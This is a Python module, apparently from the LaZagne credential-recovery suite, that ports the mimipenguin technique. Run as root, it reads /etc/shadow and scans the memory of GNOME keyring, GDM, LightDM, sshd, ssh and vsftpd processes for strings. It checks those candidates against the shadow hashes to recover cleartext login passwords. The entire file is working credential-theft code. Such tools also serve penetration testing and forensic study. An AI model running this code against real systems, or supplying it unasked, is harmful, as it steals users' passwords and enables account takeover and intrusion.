#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
    Author: Nicolas VERDIER (contact@n1nj4.eu)
    Original idea from @huntergregal (https://github.com/huntergregal/mimipenguin)
    This is a port in python of @huntergregal's bash script mimipenguin.sh with some improvments :
        - possibility to clean passwords found from memory
        - possibility to search for any trace of your password in all your processes
        - possibility to scan a process by pid
        - add some additional processes to scan like lightDM
    You can find the bleeding edge version of mimipy here : https://github.com/n1nj4sec/mimipy

"""

import os
import crypt
import re
import traceback

from lazagne.config.lib.memorpy import *
from lazagne.config.module_info import ModuleInfo
from lazagne.config.constant import python_version


class Mimipy(ModuleInfo):
    def __init__(self):
        ModuleInfo.__init__(self, 'mimipy', 'memory')

        self.shadow_hashes = []
        self.rules = [
            {
                "desc": "[SYSTEM - GNOME]",
                "process": r"gnome-keyring-daemon|gdm-password|gdm-session-worker",
                "near": r"libgcrypt\.so\..+|libgck\-1\.so\.0|_pammodutil_getpwnam_|gkr_system_authtok",
                "func": self.test_shadow,
            },
            {
                "desc": "[SYSTEM - LightDM]",  # Ubuntu/xubuntu login screen :) https://doc.ubuntu-fr.org/lightdm
                "process": r"lightdm",
                "near": r"_pammodutil_getpwnam_|gkr_system_authtok",
                "func": self.test_shadow,
            },
            {
                "desc": "[SYSTEM - SSH Server]",
                "process": r"/sshd$",
                "near": r"sudo.+|_pammodutil_getpwnam_",
                "func": self.test_shadow,
            },
            {
                "desc": "[SSH Client]",
                "process": r"/ssh$",
                "near": r"sudo.+|/tmp/ICE-unix/[0-9]+",
                "func": self.test_shadow,
            },
            {
                "desc": "[SYSTEM - VSFTPD]",
                "process": r"vsftpd",
                "near": r"^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$",
                "func": self.test_shadow,
            },
        ]

        regex_type = type(re.compile("^plop$"))
        # precompile regexes to optimize speed
        for x in self.rules:
            if "near" in x:
                if type(x["near"]) != regex_type:
                    x["near"] = re.compile(x["near"])
            if "process" in x:
                if type(x["process"]) != regex_type:
                    x["process"] = re.compile(x["process"])

        self.look_after_size = 1000 * 10 ** 3
        self.look_before_size = 500 * 10 ** 3

    def get_shadow_hashes(self):
        hashes = []
        with open('/etc/shadow', 'rb') as f:
            for line in f:
                tab = line.decode().split(":")
                if len(tab[1]) > 10:
                    hashes.append((tab[0], tab[1]))
        return hashes

    def memstrings(self, mw, start_offset=None, end_offset=None, optimizations=''):
        for _, x in mw.mem_search(r"([\x20-\x7e]{6,50})[^\x20-\x7e]", ftype='re', start_offset=start_offset,
                                  end_offset=end_offset, optimizations=optimizations):
            yield x

    def password_list_match(self, password_list, near):
        for password in password_list:
            if near.search(password.decode('latin')):
                return True
        return False

    def cleanup_string(self, s):
        try:
            ns = ""
            for c in s:
                if ord(c) < 0x20 or ord(c) > 0x7e:
                    break
                ns += c
            return ns
        except Exception: 
            return s

    def test_shadow(self, name, pid, rule, optimizations='nsrx'):
        self.info('Analysing process %s (%s) for shadow passwords ...' % (name, pid))
        password_tested = set()  # to avoid hashing the same string multiple times

        with MemWorker(name=name, pid=pid) as mw:
            scanned_segments = []

            for _, match_addr in mw.mem_search(rule["near"], ftype='re', optimizations=optimizations):
                password_list = []
                total = 0
                start = int(match_addr - self.look_after_size)
                end = int(match_addr + self.look_after_size)

                for s, e in scanned_segments:
                    if end < s or start > e:
                        continue  # no collision
                    elif start >= s and e >= start and end >= e:
                        start = e - 200  # we only scan a smaller region because some of it has already been scanned

                scanned_segments.append((start, end))

                for x in self.memstrings(mw, start_offset=start, end_offset=end, optimizations=optimizations):
                    password = self.cleanup_string(x.read(type='string', maxlen=51, errors='ignore'))
                    total += 1
                    password_list.append(password)

                    if len(password_list) > 40:
                        password_list = password_list[1:]

                    if self.password_list_match(password_list, rule["near"]):
                        for p in password_list:
                            if p not in password_tested:
                                password_tested.add(p)
                                for user, h in self.shadow_hashes:
                                    if crypt.crypt(p.decode('latin'), h) == h:
                                        p = p if python_version == 2 else p.decode()
                                        yield (rule["desc"], user, p)

    def mimipy_loot_passwords(self, optimizations='nsrx'):
        self.shadow_hashes = self.get_shadow_hashes()
        for procdic in Process.list():
            name = procdic["name"]
            pid = int(procdic["pid"])
            for rule in self.rules:
                if re.search(rule["process"], name):
                    try:
                        for t, u, p in rule["func"](name, pid, rule, optimizations=optimizations):
                            yield (t, name, u, p)
                    except Exception:
                        self.debug(traceback.format_exc())

    def run(self):
        if os.getuid() != 0:
            self.info('You need sudo privileges')
            return

        pwd_found = []
        for t, process, user, password in self.mimipy_loot_passwords(optimizations="nsrx"):
            pwd_found.append({
                'Process': str(process),
                'Login': str(user),
                'Password': str(password),
            })
        return pwd_found
